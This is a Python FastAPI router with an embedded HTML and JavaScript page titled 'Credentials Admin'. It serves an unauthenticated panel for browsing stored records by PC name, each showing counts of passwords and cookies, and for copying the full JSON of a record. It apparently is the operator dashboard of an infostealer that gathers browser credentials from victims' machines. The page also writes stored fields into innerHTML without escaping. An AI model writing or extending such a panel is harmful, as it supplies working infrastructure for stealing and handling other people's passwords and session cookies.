from fastapi import APIRouter, Query
from fastapi.responses import HTMLResponse, JSONResponse

from app.repository import (
    get_payload_by_id,
    list_distinct_environments,
    list_distinct_pc_names,
    list_payloads,
)

router = APIRouter()


@router.get("/admin-credentials", response_class=HTMLResponse)
async def admin_page() -> HTMLResponse:
    return HTMLResponse(_ADMIN_HTML)


@router.get("/admin-credentials/payloads")
async def admin_list_payloads(
    environment: str = Query(default="production"),
    pc_name: str | None = Query(default=None),
) -> JSONResponse:
    items = list_payloads(environment=environment or None, pc_name=pc_name or None)
    return JSONResponse({"items": items, "count": len(items)})


@router.get("/admin-credentials/payloads/{payload_id}")
async def admin_get_payload(payload_id: int) -> JSONResponse:
    payload = get_payload_by_id(payload_id)
    if payload is None:
        return JSONResponse({"error": "not found"}, status_code=404)
    return JSONResponse(payload)


@router.get("/admin-credentials/filters")
async def admin_filters(environment: str = Query(default="production")) -> JSONResponse:
    return JSONResponse(
        {
            "environments": list_distinct_environments(),
            "pc_names": list_distinct_pc_names(environment=environment or None),
        }
    )


_ADMIN_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Admin</title>
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: system-ui, sans-serif;
      margin: 0;
      background: #0f1115;
      color: #e6e8eb;
      min-height: 100vh;
    }
    header {
      padding: 1rem 1.25rem;
      border-bottom: 1px solid #2a2f3a;
      background: #151820;
    }
    header h1 { margin: 0; font-size: 1.1rem; font-weight: 600; }
    .layout {
      display: grid;
      grid-template-columns: 340px 1fr;
      min-height: calc(100vh - 53px);
    }
    @media (max-width: 900px) {
      .layout { grid-template-columns: 1fr; }
    }
    .sidebar {
      border-right: 1px solid #2a2f3a;
      padding: 1rem;
      overflow: auto;
    }
    .main {
      padding: 1rem 1.25rem;
      overflow: auto;
    }
    .filters {
      display: grid;
      gap: 0.75rem;
      margin-bottom: 1rem;
    }
    label {
      display: grid;
      gap: 0.35rem;
      font-size: 0.8rem;
      color: #9aa3b2;
    }
    select, input {
      width: 100%;
      padding: 0.55rem 0.65rem;
      border: 1px solid #2a2f3a;
      border-radius: 6px;
      background: #0f1115;
      color: #e6e8eb;
      font: inherit;
    }
    button {
      padding: 0.55rem 0.85rem;
      border: 1px solid #3d4660;
      border-radius: 6px;
      background: #1c2230;
      color: #e6e8eb;
      font: inherit;
      cursor: pointer;
    }
    button:hover { background: #252d3f; }
    button.primary { background: #2563eb; border-color: #2563eb; }
    button.primary:hover { background: #1d4ed8; }
    .list { display: grid; gap: 0.5rem; }
    .item {
      padding: 0.75rem;
      border: 1px solid #2a2f3a;
      border-radius: 8px;
      background: #151820;
      cursor: pointer;
    }
    .item:hover, .item.active { border-color: #2563eb; background: #1a2030; }
    .item-title { font-weight: 600; font-size: 0.92rem; }
    .item-meta { font-size: 0.78rem; color: #9aa3b2; margin-top: 0.25rem; }
    .empty {
      color: #9aa3b2;
      font-size: 0.9rem;
      padding: 1rem 0;
    }
    .viewer-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 0.75rem;
      margin-bottom: 0.75rem;
      flex-wrap: wrap;
    }
    .viewer-title { font-size: 0.95rem; font-weight: 600; }
    .viewer-actions { display: flex; gap: 0.5rem; }
    pre {
      margin: 0;
      padding: 1rem;
      border: 1px solid #2a2f3a;
      border-radius: 8px;
      background: #0b0d11;
      overflow: auto;
      max-height: calc(100vh - 160px);
      font-size: 0.78rem;
      line-height: 1.45;
      white-space: pre-wrap;
      word-break: break-word;
    }
    .status {
      font-size: 0.8rem;
      color: #22c55e;
      min-height: 1rem;
    }
    .placeholder {
      color: #9aa3b2;
      padding: 2rem 0;
      text-align: center;
    }
  </style>
</head>
<body>
  <header><h1>Credentials Admin</h1></header>
  <div class="layout">
    <aside class="sidebar">
      <div class="filters">
        <label>
          Environment
          <select id="env-filter"></select>
        </label>
        <label>
          PC
          <select id="pc-filter">
            <option value="">All</option>
          </select>
        </label>
        <button type="button" id="refresh-btn">Refresh</button>
      </div>
      <div id="list" class="list"></div>
      <div id="list-empty" class="empty" hidden>No records found.</div>
    </aside>
    <section class="main">
      <div id="viewer-placeholder" class="placeholder">Select a record to view JSON.</div>
      <div id="viewer" hidden>
        <div class="viewer-header">
          <div class="viewer-title" id="viewer-title"></div>
          <div class="viewer-actions">
            <button type="button" id="copy-btn" class="primary">Copy JSON</button>
          </div>
        </div>
        <div class="status" id="copy-status"></div>
        <pre id="json-view"></pre>
      </div>
    </section>
  </div>
  <script>
    const envFilter = document.getElementById("env-filter");
    const pcFilter = document.getElementById("pc-filter");
    const listEl = document.getElementById("list");
    const listEmpty = document.getElementById("list-empty");
    const viewer = document.getElementById("viewer");
    const viewerPlaceholder = document.getElementById("viewer-placeholder");
    const viewerTitle = document.getElementById("viewer-title");
    const jsonView = document.getElementById("json-view");
    const copyBtn = document.getElementById("copy-btn");
    const copyStatus = document.getElementById("copy-status");
    const refreshBtn = document.getElementById("refresh-btn");

    let currentJson = "";
    let selectedId = null;

    async function loadFilters() {
      const env = envFilter.value || "production";
      const res = await fetch(`/admin-credentials/filters?environment=${encodeURIComponent(env)}`);
      const data = await res.json();

      const prevEnv = envFilter.value;
      envFilter.innerHTML = "";
      const envs = data.environments.length ? data.environments : ["production"];
      for (const e of envs) {
        const opt = document.createElement("option");
        opt.value = e;
        opt.textContent = e;
        envFilter.appendChild(opt);
      }
      envFilter.value = envs.includes(prevEnv) ? prevEnv : (envs.includes("production") ? "production" : envs[0]);

      const prevPc = pcFilter.value;
      pcFilter.innerHTML = '<option value="">All</option>';
      for (const pc of data.pc_names) {
        const opt = document.createElement("option");
        opt.value = pc;
        opt.textContent = pc;
        pcFilter.appendChild(opt);
      }
      pcFilter.value = [...pcFilter.options].some(o => o.value === prevPc) ? prevPc : "";
    }

    async function loadList() {
      const params = new URLSearchParams();
      params.set("environment", envFilter.value || "production");
      if (pcFilter.value) params.set("pc_name", pcFilter.value);

      const res = await fetch(`/admin-credentials/payloads?${params}`);
      const data = await res.json();
      listEl.innerHTML = "";
      listEmpty.hidden = data.count > 0;

      for (const item of data.items) {
        const el = document.createElement("div");
        el.className = "item" + (item.id === selectedId ? " active" : "");
        el.dataset.id = item.id;
        el.innerHTML = `
          <div class="item-title">${item.pc_name}</div>
          <div class="item-meta">
            #${item.id} · ${item.environment}<br>
            ${item.datetime}<br>
            ${item.password_count ?? 0} passwords · ${item.cookie_count ?? 0} cookies
          </div>`;
        el.addEventListener("click", () => selectItem(item.id));
        listEl.appendChild(el);
      }
    }

    async function selectItem(id) {
      selectedId = id;
      copyStatus.textContent = "";
      for (const el of listEl.querySelectorAll(".item")) {
        el.classList.toggle("active", Number(el.dataset.id) === id);
      }

      const res = await fetch(`/admin-credentials/payloads/${id}`);
      if (!res.ok) return;
      const data = await res.json();
      currentJson = JSON.stringify(data.content, null, 2);
      viewerTitle.textContent = `${data.pc_name} · ${data.datetime}`;
      jsonView.textContent = currentJson;
      viewer.hidden = false;
      viewerPlaceholder.hidden = true;
    }

    async function copyJson() {
      copyStatus.textContent = "";
      try {
        await navigator.clipboard.writeText(currentJson);
        copyStatus.textContent = "Copied";
      } catch (e) {
        const textarea = document.createElement("textarea");
        textarea.value = currentJson;
        textarea.style.position = "fixed";
        textarea.style.opacity = "0";
        document.body.appendChild(textarea);
        textarea.select();
        copyStatus.textContent = document.execCommand("copy") ? "Copied" : "Could not copy";
        textarea.remove();
      }
    }

    envFilter.addEventListener("change", async () => {
      await loadFilters();
      await loadList();
    });
    pcFilter.addEventListener("change", loadList);
    refreshBtn.addEventListener("click", async () => {
      await loadFilters();
      await loadList();
    });
    copyBtn.addEventListener("click", copyJson);

    (async () => {
      await loadFilters();
      if (!envFilter.value) envFilter.value = "production";
      await loadList();
    })();
  </script>
</body>
</html>"""
